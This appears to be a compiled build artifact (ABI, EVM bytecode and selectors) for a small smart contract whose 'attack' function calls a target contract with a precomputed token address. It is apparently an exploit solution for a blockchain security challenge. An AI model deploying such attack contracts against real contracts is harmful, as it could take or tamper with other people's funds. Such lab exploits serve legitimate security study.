{"abi":[{"type":"constructor","inputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"attack","inputs":[{"name":"target","type":"address","internalType":"address payable"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"calculatedToken","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"}],"bytecode":{"object":"0x60a060405273a16e02e87b7454126e5e10d957a927a7f5b5d2be6080523480156026575f5ffd5b506080516040805160609290921b6001600160601b031916602080840191909152600160f81b603484015281516015818503018152603590930190915281519101205f80546001600160a01b0319166001600160a01b039290921691909117905560805161029161009e5f395f609b01526102915ff3fe608060405234801561000f575f5ffd5b5060043610610034575f3560e01c8063cd8d1f4614610038578063d018db3e14610080575b5f5ffd5b5f546100579073ffffffffffffffffffffffffffffffffffffffff1681565b60405173ffffffffffffffffffffffffffffffffffffffff909116815260200160405180910390f35b61009361008e3660046101f5565b610095565b005b604080517f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff90811660248084019190915283518084039091018152604490920183526020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff167f87335b7a0000000000000000000000000000000000000000000000000000000017905291515f928416916101449161022f565b5f604051808303815f865af19150503d805f811461017d576040519150601f19603f3d011682016040523d82523d5f602084013e610182565b606091505b50509050806101f1576040517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152600d60248201527f41747461636b206661696c656400000000000000000000000000000000000000604482015260640160405180910390fd5b5050565b5f60208284031215610205575f5ffd5b813573ffffffffffffffffffffffffffffffffffffffff81168114610228575f5ffd5b9392505050565b5f82515f5b8181101561024e5760208186018101518583015201610234565b505f92019182525091905056fea2646970667358221220fa7339f35d4751a480673ca81299036c005913a018ffcaa90cfad7caae59c6ef64736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"attack(address)":"d018db3e","calculatedToken()":"cd8d1f46"},"id":0}